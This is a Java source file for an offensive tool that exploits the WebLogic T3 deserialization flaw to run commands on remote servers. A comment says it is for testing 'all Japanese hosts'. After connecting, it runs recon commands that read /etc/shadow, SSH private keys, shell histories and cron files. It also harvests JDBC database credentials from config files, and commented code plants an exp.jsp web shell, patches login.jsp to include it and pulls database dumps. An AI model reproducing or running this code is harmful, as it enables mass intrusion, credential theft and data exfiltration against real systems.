package com.mtx.tianxia.hacker;

import java.io.File;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;
import java.util.TreeMap;

import javax.naming.InitialContext;
import javax.servlet.jsp.JspWriter;

import weblogic.jndi.internal.InitApp;

import com.mtx.xiatian.hacker.weblogic.GetShellWL;
import com.mtx.xiatian.hacker.weblogic.RyClient;

/**
 * weblogic java序列化漏洞
 * 
 * @author xiatian
 */
public class MTX_AttackWeblogic extends InfoLog
{
	/**
	 * 执行命令，并记录返回结果
	 * @param szFile
	 * @param s
	 */
	private void getCmd(String szFile, String s)
	{
		String []a = s.split("\\s*[;；]\\s*");
		for(int i = 0, j = a.length; i < j; i++)
		{
			String x = a[i];
			x = x.trim();
			// 没有命令就不处理
			if(0 == x.length())continue;
			// 处理\; 这种多方命令的特殊方式：find . -type f -size +100000k -exec ls -lh {} \; | awk  '{ print $9 ":" $5 }'
			if(x.endsWith("\\"))
			{
				if(i <= j - 2)
				{
					x = x + ";" + a[i + 1];
					a[i + 1] = "";
				}
			}
			info(x);
			writeFile(szFile, x  + "\n"+ App.runCmd(x) + "\n");
		}
	}
	// 线程中删除临时文件
	protected boolean bThreadDel = false, bThreadDelOk = false;
	public  void doGetInfo()
	{
		String szFile = "data/" + szServer+"_" + port + ".txt";
		File fOld = new File(szFile); 
		if(fOld.exists())
		{
//			fOld.renameTo(new File("data/" + szServer+"_" + port + "_"+ System.nanoTime() + ".txt"));
			return;
		}
		
		String szMyHackFile = InfoLog.getFile(new File("/Users/xiatian/project/sfTester/data/exp.jsp"));
		
		String s = App.runCmd("cmd.exe /c ver");
		String []a = null;
		writeFile(szFile, "1、系统版本信息：\n");
		final boolean bWin = (null != s && -1 < s.indexOf("Microsoft Windows"));
		if(bWin)
		{
			writeFile(szFile, s + "\n");
			 a = new String[]{
					 "服务器时间",
					 "date /t;uptime",
					 "当前目录",
					 "cmd.exe /c echo %cd%",
						"网络ip配置",
						"cmd.exe /c ipconfig  /all",
						"arp信息",
						"cmd.exe /c arp -a",
						"主机信息1",
						"systeminfo.exe",
						"主机信息2",
						"cmd.exe /c SYSTEMINFO  ",
						"进程信息",
						"cmd.exe /c TASKLIST /V",
						"服务信息",
						"cmd.exe /c sc query",
						"网络信息",
						"netstat -ano",
						"系统环境信息",
						"cmd.exe /c set",
//						"当前目录下所有登录文件",
//						"cmd.exe /c dir /s /b  .\\*ogin.jsp",
//						"当前目录下所有logout.jsp文件",
//						"cmd.exe /c dir /s /b  .\\logout.jsp",
//						"当前目录下所有index.jsp文件",
//						"cmd.exe /c dir /s /b  .\\index.jsp",
						
//						"1\\t703ps\\war\\index.jsp",
//						"cmd.exe /c type   C:\\Oracle\\Middleware\\user_projects\\domains\\Pjsy_domain\\servers\\AdminServer\\tmp\\_WL_user\\1\\t703ps\\war\\index.jsp",
						
//						"当前目录下所有war文件",
//						"cmd.exe /c dir /s /b  .\\*.war",
//						"当前目录下所有jdbc.pro*文件",
//						"cmd.exe /c dir /s /b  .\\jdbc.pro*",
//						"当前目录下所有spring-datasource.xml文件",
//						"cmd.exe /c dir /s /b  .\\spring-datasource.xml"
						
						}
						;
		}
		else
		{
			getCmd(szFile,"uname -a;w;id;who");
			 a = new String[]{
					 "echo 查看java可以通讯",
					 "netstat -anp | grep java | grep ESTABLISHED | grep -v .216 | grep -v LISTENING | grep -v CONNECTED",
					 "echo 查看加载的模块",
					 "lsmod",
					 "echo 看rpc服务开放",
					 "rpcinfo -p",
					 "echo 补丁情况",
					 "rpm -qa",// | grep patch
					  "echo 查看服务状态",
					  "service --status-all",
					 "系统是什么版本?",
					 "cat /etc/issue ; cat /etc/*-release ; cat /etc/lsb-release ; cat /etc/redhat-release",
					 "是root吗？",
					 "cat /etc/sudoers;cat /etc/passwd ;cat /etc/group ;cat /etc/shadow ;ls -alh /var/mail/;ls -ahlR /home/;ls -ahlR /root/",
					 "查找mysql数据文件",
					 "find /var/lib/mysql/ -regex \".*\\.frm\\|.*\\.idb\\|.*\\.MYI\\|.*\\.MYD\"",
					 "历史操作信息",
					 "cat ~/.bash_history ;cat ~/.nano_history ;cat ~/.atftp_history ;cat ~/.mysql_history ;cat ~/.php_history ;cat ~/.bashrc ;cat ~/.profile ;cat /var/mail/root ;cat /var/spool/mail/root ;cat ~/.ssh/authorized_keys ;cat ~/.ssh/identity.pub ;cat ~/.ssh/identity ;cat ~/.ssh/id_rsa.pub ;cat ~/.ssh/id_rsa ;cat ~/.ssh/id_dsa.pub ;cat ~/.ssh/id_dsa ;cat /etc/ssh/ssh_config ;cat /etc/ssh/sshd_config ;cat /etc/ssh/ssh_host_dsa_key.pub ;cat /etc/ssh/ssh_host_dsa_key ;cat /etc/ssh/ssh_host_rsa_key.pub ;cat /etc/ssh/ssh_host_rsa_key ;cat /etc/ssh/ssh_host_key.pub ;cat /etc/ssh/ssh_host_key ;ls -alh /var/log ;ls -alh /var/mail ;ls -alh /var/spool ;ls -alh /var/spool/lpd ;ls -alh /var/lib/pgsql ;ls -alh /var/lib/mysql ;cat /var/lib/dhcp3/dhclient.leases ;ls -alhR /var/www/ ;ls -alhR /srv/www/htdocs/ ;ls -alhR /usr/local/www/apache22/data/ ;ls -alhR /opt/lampp/htdocs/ ;ls -alhR /var/www/html/",
					 "服务器时间，及当前目录",
					 "date;uptime; pwd",
					 "echo sshd安装情况",
					 "ldd /usr/sbin/sshd",
					 "内核版本是什么？",
					 "uname -mrs;  dmesg | grep Linux  ; cat /proc/version ; rpm -q kernel ; ls /boot | grep vmlinuz",
					 "环境变量里有些什么？",
					 "cat /etc/profile ; cat /etc/bashrc ; cat ~/.bash_profile ; cat ~/.bashrc ; env ; set ; cat ~/.bash_logout",
					 "文件句柄配置情况",
						"cat /proc/sys/fs/file-nr",
						"缓存？IP和/或MAC地址?",
						"arp -a",
						"当前内存使用情况",
						"free -m;ulimit -n;ulimit -a",
						"主机中的用户名清单",
						"cat /etc/passwd |cut -f 1 -d :", // 查看所有用户
						"Linux块设备的信息.块设备是硬盘和闪驱等之类的存储设备"
						,"lsblk -a"
						,"文件系统信息"
						,"df -h" 
						,"进程、服务信息"
						,"ps -aeo ruser,ppid,pid,lstart,%cpu,%mem,etime,tty,args --sort -%cpu,-%mem;cat /etc/service"
						,"安装的应用信息"
						,"ls -alh /usr/bin/;ls -alh /sbin/;ls -alh /var/cache/yum/;ls -alh /var/cache/apt/archivesO;rpm -qa;dpkg -l"
						,"Service设置，有任何的错误配置吗？是否有任何（脆弱的）的插件？"
						,"cat /etc/syslog.conf ; cat /etc/chttp.conf ; cat /etc/lighttpd.conf ; cat /etc/cups/cupsd.conf ; cat /etc/inetd.conf ; cat /etc/apache2/apache2.conf ; cat /etc/my.conf ; cat /etc/httpd/conf/httpd.conf ; cat /opt/lampp/etc/httpd.conf ; ls -aRl /etc/ | awk ‘$1 ~ /^.*r.*/"
						,"主机上有哪些工作计划？"
						,"ls -alh /var/spool/cron ;ls -al /etc/ | grep cron ;ls -al /etc/cron* ;cat /etc/cron* ;cat /etc/at.allow ;cat /etc/at.deny ;cat /etc/cron.allow ;cat /etc/cron.deny ;cat /etc/crontab;cat /etc/anacrontab;cat /var/spool/cron/crontabs/root;crontab -l"
						,"cpu信息"
						,"cat /proc/cpuinfo"
						,"内存使用情况"
						,"cat /proc/meminfo"
						,"系统的分区信息"
						,"cat /proc/partitions"
						,"网络配置信息"
						,"route;last;lsof -i;cat /etc/services;/sbin/ifconfig -a;cat /etc/network/interfaces;cat /etc/sysconfig/network;cat /etc/resolv.conf;cat /etc/sysconfig/network ;cat /etc/networks ;iptables -L ;hostname ;dnsdomainname"
						," 端口和服务的查看"
						,"netstat -a;chkconfig --list"
						,"大于100M的文件"
						,"find / -type f -size +100000k -exec ls -lh {} \\; | awk  '{ print $9 \":\" $5 }'"
						,"当前目录jdbc"
						,"find . -name jdbc.*",
						"所有jsp文件"
						,"find . -name *.jsp",
						"所有war"
						,"find . -name *.war",
						"所有ear"
						,"find . -name *.ear"
						/*
						,"所有文件日期"
						,"ls -la -R .",
						
						"当前目录下所有登录文件",
						"find . -name   *ogin.jsp",
						"当前目录下所有logout.jsp文件",
						"find . -name   logout.jsp",
						"当前目录下所有index.jsp文件",
						"find . -name   index.jsp",
						"当前目录下所有war文件",
						"find . -name  *.war",
						"当前目录下所有jdbc.pro*文件",
						"find . -name  jdbc.pro*",
						"当前目录下所有spring-datasource.xml文件",
						"find . -name  spring-datasource.xml"*/
			 };
		}
		 for(int i = 0, j = a.length; i < j; i+=2)
		 {
			 writeFile(szFile, (i + 2)  + "、"+ a[i] + "\n");
//			 writeFile(szFile, a[i + 1] + "\n");
			 getCmd(szFile, a[i + 1]);
		 }
		 if(bWin)
			{
			 a = new String[]{
//			 "数据库连接文件信息",
//				"cmd.exe /c findstr /S /I /M /c:\".jdbc.driver.\"  *jdbc*.*",
//				"数据库连接文件信息",
//				"cmd.exe /c findstr /S /I /M /c:\".jdbc.driver.\"  *sqlMapconfig*.*",
//				"数据库连接文件信息",
//				"cmd.exe /c findstr /S /I /M /c:\".jdbc.driver.\"  spring-datasource.xml"
			 };
			}
		 else
		 {
			 a = new String[]{
					 "数据库连接文件信息",
						"find . -name  *jdbc*.*",
						"数据库连接文件信息",
						"find . -name    *sqlMapconfig*.*",
						"数据库连接文件信息",
						"find . -name    spring-datasource.xml"
					 };
		 }
		 String sFs = null;
		 String []fs;
		 String szFgfh = bWin ? "\\" : "/", WEB_INF = szFgfh + "WEB-INF" + szFgfh, szCtxPath = "", szWEB_INF, exp = "exp.jsp", szUrl,
				 szChart = "UTF-8";
		 int y = 0;
		 for(int i = 0, j = a.length; i < j; i+=2)
		 {
			 writeFile(szFile, (i + 2)  + "、"+ a[i] + "\n");
			 writeFile(szFile, a[i + 1] + "\n");
			 fs = (sFs = App.runCmd(a[i + 1]).trim()).split("\n");
			 boolean bHvCpexp = false;
			 Map <String, Boolean>m1 = new HashMap<String, Boolean>(); 
			 // 读取文件内容
			 for(String x: fs)
			 {
				 x = x.trim();
				 if(x.endsWith(".jar"))continue;
				 if(0 < x.length())
				 {
					 szCtxPath = "";
					 writeFile(szFile, x + "\n");
					 sFs = App.runCmd((bWin ? "cmd.exe /c type ": "cat ") + x).trim();
					 sFs = sFs.replaceAll("#[^\\n\\r$]*(\\n|$)", "");
					 sFs = sFs.replaceAll("\\n[ \\t\\r]*\\n", "\n");
					 // 连接信息内容
					 writeFile(szFile, sFs + "\n");
					 // 得到WEB-INF路径，也就是上传
					 y = x.indexOf(WEB_INF);
					 if(-1 < y)
					 {
						 szWEB_INF = (szCtxPath = x.substring(0, y)) + szFgfh + exp;
						 if(!m1.containsKey(szWEB_INF))
						 {
							 // 避免无法覆盖
							 App.runCmd((bWin ? "cmd.exe /c  del  /S /Q  ": "rm -rf ") + szWEB_INF);
							 // 上传测试软件
							 m1.put(szWEB_INF, Boolean.TRUE);
							 
//							 App.putFile(szMyHackFile, szWEB_INF);
//							 info(szWEB_INF);
//							 writeFile(szFile, "上传测试软件：" + szWEB_INF + "\n");
							 
							 bHvCpexp = true;
						 }
					 }
					 if(!bHvCpexp)
					 {
						 x = App.runCmd(bWin ? "cmd.exe /c  dir  /S /B .\\login.jsp":"find . -name login.jsp");
						 final String []xyz = x.trim().split("login\\.jsp\\s*");
						 String szOldLoginPath = "";
						 for(String x1:xyz)
						 {
							 x1 = szOldLoginPath = x1.trim();
							 x1 = x1+ "exp.jsp";
							 if(!m1.containsKey(x1))
							 {
//								 App.putFile(szMyHackFile, x1);
//								 App.runCmd((bWin ? "cmd.exe /c  " : "" ) + "echo \"<%@ include file=\\\"/exp.jsp\\\"%>\" >> " + szOldLoginPath + "login.jsp");
//								 writeFile(szFile, "上传测试软件：" + x1 + "\n");
//								 info(x1);
								 writeFile(szFile, "测试关联：" + App.runCmd((bWin ? "cmd.exe /c  type " : "cat " )  + szOldLoginPath + "login.jsp") + "\n");
								 bHvCpexp = true;
								 m1.put(x1, Boolean.TRUE);
							 }
						 }
//						 bThreadDel = true;
//						 MyThreadPoolExecutor.getInstance().addRunnable(new Runnable()
//							{
//								public void run()
//								{
//									try{
//										// 10秒后开始删除
//										Thread.sleep(10000);
//										for(String x1:xyz)
//										 {
//											if(x1.endsWith("exp.jsp"))
//											{
//												App.runCmd((bWin ? "cmd.exe /c  del /S /Q  " : "rm -rf " ) + x1);
//												info("删除测试文件：", x1);
//											}
//										 }
//										bThreadDelOk = true;
//									 }catch(Throwable e)
//									 {e.printStackTrace();}
//								}
//							});
					 }
					 
					// 分析连接信息
					// http://219.129.166.100/exp.jsp?k1=oracle.jdbc.driver.OracleDriver&k2=jdbc:oracle:thin:%40129.1.20.104:1521:swwzdb&k3=sw_xcms&k4=sw_xcms
					 if(szCtxPath.endsWith(szFgfh))
						 szCtxPath = szCtxPath.substring(0, szCtxPath.length() -1 );
					 szCtxPath = szCtxPath.substring(szCtxPath.lastIndexOf(szFgfh) + 1);
					 try
					 {
						 if("root".equalsIgnoreCase(szCtxPath) || "/".equals(szCtxPath))szCtxPath = "";
						 else if(1 < szCtxPath.length())szCtxPath = "/" + szCtxPath;
						 String []szDrv = getPatternStr("jdbc\\.driverClassName\\s*=\\s*([^\\n]*)", sFs);
//						 if(0 < szDrv.length())
						 {
//								szUrl = " http://" + szServer + ":" + port + szCtxPath + "/exp.jsp?k1="
//								 + java.net.URLEncoder.encode(szDrv, szChart)
//								 + "&k2=" + java.net.URLEncoder.encode(getPatternStr("jdbc\\.url\\s*=\\s*([^\\n]*)", sFs).trim(), szChart)
//								 + "&k3=" + java.net.URLEncoder.encode(getPatternStr("jdbc\\.username\\s*=\\s*([^\\n]*)", sFs).trim(), szChart)
//								 + "&k4=" + java.net.URLEncoder.encode(getPatternStr("jdbc\\.password\\s*=\\s*([^\\n]*)", sFs).trim(), szChart)
//								 ;
//								writeFile(szFile, "下载数据的连接地址\n");
//								writeFile(szFile, szUrl + "\n");
//								info(szUrl);
							 
//								final String szKUrl = szUrl, szCTX9 = szCtxPath;
//								MyThreadPoolExecutor.getInstance().addRunnable(new Runnable()
//								{
//									public void run()
//									{
//										try{
//											FileOutputStream fos = null;
//											MyDownloadWithCookie.getUrlStr(szKUrl, null, fos = new FileOutputStream("data/" + szCTX9 + ".sql"), null);
//											if(null != fos)
//												fos.close();
//										 }catch(Throwable e)
//										 {e.printStackTrace();}
//									}
//								});
						 }
					 }catch(Throwable e)
					 {e.printStackTrace();}
				 }
			 }
			 
			 // 生成下载指令
		 }
	}
	InitialContext Ic = null;
	InitApp App = null;
	String szServer,  port;
	private void doUnd()
	{
		if(null != Ic)
		{
			try
			{
				if(bLookup)Ic.unbind("__WL_InitialLib");
				if(bConn)GetShellWL.DisConnect(szServer, port);
//				MyThreadPoolExecutor.getInstance().destroy();
			} catch (Exception e)
			{
			}
		}
	}
	boolean bConn = false, bLookup = false;
	public  boolean connSvr(String szServer, String port, String Content, String Path)
	{
		try
		{
			bConn = bLookup = false;
			this.szServer = szServer;
			this.port = port;
			// 连接
			try
			{
				System.out.println( getTime()+" 开始连接：" + szServer + ":" + port);
				GetShellWL.Connect(szServer, port);
				System.err.println("GetShellWL.Connect连接成功：" + szServer + ":" + port);
				bConn = true;
			} catch (Exception e)
			{
//				e.printStackTrace();
				System.out.println("GetShellWL.Connect连接失败：" + szServer + ":" + port);
				return false;
			}
				System.out.println("开始t3漏洞协议连接：" + szServer + ":" + port);
				Ic = RyClient.getInitialContext("t3://" + szServer + ":" + port);
				System.err.println("t3协议初始化成功！:" + szServer + ":" + port);
				System.out.println("开始__WL_InitialLib漏洞注入连接：" + szServer + ":" + port);
				App = ((InitApp) Ic.lookup("__WL_InitialLib"));
				bLookup = true;
			System.err.println("__WL_InitialLib漏洞注入点连接成功！:" + szServer + ":" + port);

//			App.runCmd("cmd.exe /c  del  /S /Q  " + "D:\\Middleware\\user_projects\\domains\\wzww_domain\\servers\\appserver7003\\stage\\swwssb\\swwssb\\exp.jsp");
//			App.runCmd("cmd.exe /c  del  /S /Q " + "D:\\Middleware\\user_projects\\domains\\wzww_domain\\autodeploy\\ROOT\\exp.jsp");
//			App.runCmd("cmd.exe /c  del  /S /Q " + "D:\\Middleware\\user_projects\\domains\\wzww_domain\\servers\\appserver7003\\stage\\ROOT\\ROOT\\exp.jsp");
			System.err.println("连接成功，开始进行服务器信息收集：" + szServer + ":" + port);
			doGetInfo();
//			if(null != Content)
//				App.putFile(Content, Path);
//			System.err.println(App.runCmd("cmd.exe /c /S /B dir  .\\servers\\AdminServer\\tmp\\.appmergegen_1403005062659_czggfwxt.ear"));
//			System.err.println(App.runCmd("cmd.exe /c  type D:\\Middleware\\user_projects\\domains\\wzww_domain\\autodeploy\\ROOT\\WEB-INF\\config\\jdbc.properties"));
			return true;
		} catch (Exception ex)
		{
			System.out.println("t3协议、或__WL_InitialLib漏洞注入点连接失败(通常认为没有java反序列化远程执行漏洞)！" + szServer + ":" + port);
//			ex.printStackTrace();
		} finally
		{
			if (null != Ic)
			{
				try
				{
					if(bThreadDel)
					{
						MyThreadPoolExecutor.getInstance().addRunnable(new Runnable()
						{
							public void run()
							{
								try{
									while(!bThreadDelOk)
									{
										Thread.sleep(133);
									}
									doUnd();
									bThreadDelOk = false;
									bThreadDel = false;
								 }catch(Throwable e)
								 {e.printStackTrace();}
							}
						});
					}
					else
					{
						doUnd();
					}
				} catch (Exception e)
				{
					e.printStackTrace();
				}
			}
		}
		return false;
	}
	/*
	显示当前目录文件，便于分析那些文件被修改过
	便于找出黑客软件
	*/
	public static void doList(JspWriter out, String s,java.util.List <Object[]> list1, boolean bDg)
	{
	   if(null == s)s = ".";
	   java.util.List <Object[]> list = null != list1 ? list1 : new java.util.ArrayList<Object[]>(){
        public boolean add(Object[] e)
        {
			Long ln1 = (Long)e[0];
			for(int j = size() - 1; 0 <=  j; j--)
			{
				if(ln1 > (Long)get(j)[0])continue;
				add(j + 1, e);
				return true;
			}
			add(0, e);
	        return true;
        }
		   
	   };
	   java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
	   File file = new File(s);
	   File []fs = file.listFiles();
	   Object []oDatas = null;
	   if(null != fs && 0 < fs.length)
	   {
		   for(File f: fs)
		   {
			   if(f.isDirectory() && !("..".equals(f.getName()) || ".".equals(f.getName())))
				   doList(out, f.getAbsolutePath(), list, true);
			   else
			   {
				   oDatas = new Object[]{f.lastModified(), sdf.format(new java.util.Date(f.lastModified())), f.getAbsolutePath()};
				   list.add(oDatas);
			   }
		   }
	   }
	   if(bDg)return;
	   // 输出
	   for(Object []oT : list)
	   {
		   try
        {
	        out.println((String)oT[1] +"\t"+ (String)oT[2]);
        } catch (Exception e1)
        {
	        e1.printStackTrace();
        }
	   }
	}
	/*
	 * 单个ip处理
	 * */
	public static String getOneIp(String s)
	{
		;
		return s;
	}
	
	public static String getIps(String s)
	{
		int i = s.indexOf('-'), j = s.indexOf('/');
		if(-1 == i || -1 == j)return s;
		StringBuffer buf = new StringBuffer(); 
		String []a = s.split(";");
		for(int x = 0, y = a.length; x < y; x++)
		{
			i = a[x].indexOf('-');
			j = a[x].indexOf('/');
			if(-1 == i && -1 == j)
			{
				buf.append(a[x]).append(";");
			}
			else
			{
				a[x] = getOneIp(a[x]);
			}
		}
		if(0 == buf.length())return s;
		
		return buf.toString();
	}
	
	/**
	 * ip:port;
	 * 测试所有日本主机的反序列化漏洞
	 * @param args
	 */
	public static void main(String[] args)
	{
		System.setProperty("java.net.useSystemProxies", "true");
		final MTX_AttackWeblogic ma = new MTX_AttackWeblogic();
		if(0 < args.length)
		{
			String []a = getIps(args[0]).split(";"), ab;
			for(int i = 0, j = a.length; i < j; i++)
			{
				ab = a[i].split(":");
				ma.connSvr(ab[0] , ab[1], null, null);
			}
			return ;
		}
	}
}
